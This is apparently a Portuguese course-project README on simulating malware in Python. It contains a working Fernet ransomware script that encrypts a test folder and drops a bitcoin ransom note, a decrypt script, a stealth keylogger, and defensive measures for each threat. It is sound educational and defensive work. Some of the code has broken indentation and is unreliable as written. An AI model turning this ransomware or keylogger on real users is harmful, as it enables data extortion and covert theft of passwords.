
**Implementar, documentar e compartilhar** um projeto prático utilizando **Python**, simulando o comportamento de Malwares em um ambiente seguro.

- **Ransomware Simulado**: criar arquivos de teste, implementar um script que criptografa e descriptografa, além de gerar mensagem de “resgate”.    
- **Keylogger Simulado**: programar captura de teclas em arquivo `.txt`, torná-lo mais furtivo e implementar envio automático por e-mail.    
- **Reflexão sobre Defesa**: documentar medidas de prevenção e defesa (antivírus, firewall, sandboxing, conscientização do usuário).

----
## Tipo de ameaça - Ransowere

-----

**Descrição**: Criptografa os arquivos de um sistema e exige um resgate em dinheiro para devolvê-los, muitas vezes por meio de pagamentos em criptomoedas.

Exemplo de um código ransowere (Criptografia e Descriptografia):

Encryption.py
```python
from cryptography.fernet import Fernet
import os  

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
	chave = Fernet.generate_key()
	with open("chave.key", "wb") as chave_file:
		chave_file.write(chave)  

#2. Carregar a chave salva
def carregar_chave():
	return open("chave.key", "rb").read()  

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
	f = Fernet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read()
	dados_encriptados = f.encrypt(dados)
	with open(arquivo, "wb") as file:
		file.write(dados_encriptados)  

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
			if nome != "ransoware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

  

#5. Mensagem de resgate
def criar_mensagem_resgate():
	with open("LEIA ISSO.txt", "w") as f:
		f.write("Seus arquivos foram criptografados!\n")
		f.write("Envie 1 bitcoin para o endereço X e o comprovante!\n")
		f.write("Depois disso, enviaremos a chave para recuperar seus dados!\n")
		f.write("('w')")
  
#6. Execução principal
def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos = encontrar_arquivos("test_files")
	for arquivo in arquivos:
		criptografar_arquivo(arquivo, chave)
	criar_mensagem_resgate()
	
print("Ransoware executado com sucesso!\n Arquivos criptografos!")

  

if __name__=="__main__":
	main()

```


decrypt.py
```Python
from cryptography.fernet import Fernet
import os  

def carregar_chave():
	return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
	f = Fernet(chave)
	with open(arquivo, "rb") as file:
		dados = file.read()
		dados_descriptografados = f.decrypt(dados)

with open(arquivo, "wb") as file:
	file.write(dados_descriptografados)
	
def encontrar_arquivos(diretorio):
	lista = []

	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz, nome)
				if nome != "ransoware.py" and not nome.endswith(".key"):
					lista.append(caminho)
		return lista

  

def main():
	chave = carregar_chave()
	arquivos = encontrar_arquivos("test_files")
	for arquivo in arquivos:
	descriptografar_arquivo(arquivo, chave)
	print("Arquivos restaurados com sucesso")

  

if __name__ == "__main__":

main()


```

## Medidas de defesa:

==Inclui uma abordagem em camadas, combinando medidas preventivas e o uso de software de segurança==. É crucial manter softwares atualizados, realizar backups frequentes e isolados, usar firewalls e antivírus, além de treinar usuários para identificar e evitar links e anexos suspeitos.

### Medidas preventivas

- **Ter cuidado com e-mails e links:** Não abrir anexos ou clique em links de e-mails suspeitos ou não confiáveis.
- **Baixe de fontes confiáveis:** Fazer downloads de software apenas de sites conhecidos e confiáveis.
- **Usar VPNs:** Utilize uma VPN para proteger sua conexão ao usar Wi-Fi público.
- **Manter tudo atualizado:** Mantenha sistemas operacionais e programas sempre atualizados para corrigir vulnerabilidades de segurança.
- **Ter atenção aos dispositivos externos:** Não utilizar pendrives ou outros dispositivos USB desconhecidos.
- **Usar senhas fortes:** Utilizar senhas robustas e ativar a autenticação multifator sempre que possível.

### Software e segurança 

- **Manter um software de segurança:** Use um antivírus e uma solução anti-ransomware abrangente que detecte e bloqueie ameaças.
- **Utilizar firewalls:** Implemente firewalls para controlar o tráfego de rede.
- **Implementar segurança de e-mail:** Utilizar filtros de e-mail para identificar e bloquear ameaças antes que cheguem aos usuários.
- **Realizar backup dos dados:** Mantenha backups regulares dos seus dados importantes. Idealmente, mantenha-os em um local isolado e offline para que não sejam atingidos por um ataque. 

### Segurança de rede 

- **Monitorar portas de rede:** Revise e limite o acesso a portas de rede como RDP (porta 3389)  e SMB (porta 445), limitando as conexões a hosts confiáveis.
- **Segmentar a rede:** Divida a rede em segmentos menores para limitar o movimento lateral de um possível ataque.


----
# Tipo de ameaça - Keylogger

-----

**Descrição**: Monitoram a atividade do usuário secretamente, coletando informações como senhas, dados bancários e outros dados confidenciais para vender ou usar indevidamente.

Exemplo de código furtivo: keylogger.pyw

```python
from pynput import keyboard

IGNORAR = {
	keyboard.Key.shift,
	keyboard.Key.shift_r,
	keyboard.Key.ctrl_l,
	keyboard.Key.ctrl_r,
	keyboard.Key.alt_l,
	keyboard.Key.alt_r,
	keyboard.Key.caps_lock,
	keyboard.Key.cmd
}
def on_press(key):
	try:
		# se for uma tecla "normal" (letra, número, símboolo)
		with open("log.txt", "a", encoding="utf-8") as f:
			f.write(key.char)
		except AttributeError:
			with open("log.txt", "a", encoding="utf-8") as f:
				if key == keyboard.Key.space:
					f.write(" ")
				elif key == keyboard.Key.enter:
					f.write("\n")
				elif key == keyboard.Key.tab:
					f.write("\t")
				elif key == keyboard.Key.backspace:
					f.write(" ")
				elif key == keyboard.Key.esc:
					f.write(" [ESC] ")
				elif key in IGNORAR:
					pass
				else:
					f.write(f"[{key}] ")
		
		  

with keyboard.Listener(on_press=on_press) as listener:
	listener.join()
```

## Medidas de defesa:

É essencial ==adotar uma abordagem em múltiplas camadas, combinando boas práticas de segurança com o uso de ferramentas especializadas. ==

##### Medidas de proteção e prevenção

**1. Usar um software de segurança robusto** 

- Instalar e manter atualizado um pacote de antivírus e antispyware confiável (como Kaspersky, Bitdefender ou Malwarebytes). Esses programas detectam e removem softwares maliciosos, incluindo keyloggers.
- Ativar o firewall para monitorar e controlar o tráfego de rede, bloqueando conexões suspeitas que poderiam ser usadas por keyloggers para enviar suas informações. 

**2. Adotar a autenticação de dois fatores (2FA)** 

- Ativar a autenticação de dois fatores em contas online. Mesmo que um keylogger roube sua senha, o invasor não conseguirá acessar a conta sem o segundo código de verificação, que geralmente é enviado para o celular. 

**3. Usar o teclado virtual** 

- Ao digitar informações sensíveis, como senhas e dados bancários, usar o teclado virtual do sistema operacional. Ele evita que o keylogger registre as teclas físicas que você pressionou, pois a entrada é feita diretamente pelo mouse. 

**4. Manter o software sempre atualizado** 

- Atualizar o sistema operacional, o navegador e outros programas regularmente. As atualizações frequentemente incluem correções de segurança que impedem que keyloggers explorem vulnerabilidades conhecidas para se instalarem. 

**5. Ser cauteloso online**

- **Evitar links e anexos suspeitos:** Não clique em links nem baixe arquivos de fontes desconhecidas ou não confiáveis. Muitos keyloggers são distribuídos por meio de e-mails de phishing ou downloads maliciosos.
- **Cuidado com dispositivos USB:** Não conecte dispositivos USB de origem desconhecida ao seu computador, pois keyloggers de hardware podem ser instalados dessa forma.
- **Atenção a redes públicas:** Evite digitar informações sensíveis ao usar redes de Wi-Fi públicas, que são mais vulneráveis a ataques. 

**6. Criar senhas fortes e únicas**

- Utilizar senhas longas, complexas e diferentes para cada conta. O uso de um gerenciador de senhas pode ajudar a criar e armazenar senhas seguras. 

**7. Inspecionar o hardware**

- Verifique fisicamente os conectores do teclado em busca de dispositivos estranhos, como adaptadores USB, que podem ser keyloggers de hardware disfarçados. 

##### O que fazer em caso de infecção

- **Desconecte-se da internet:** Isole o dispositivo infectado imediatamente para impedir que o keylogger envie seus dados.
- **Rode uma varredura completa:** Execute uma varredura completa do sistema com seu software de antivírus para detectar e remover o keylogger.
- **Altere suas senhas:** Após a remoção do malware, altere imediatamente todas as senhas de contas que você usou no dispositivo.
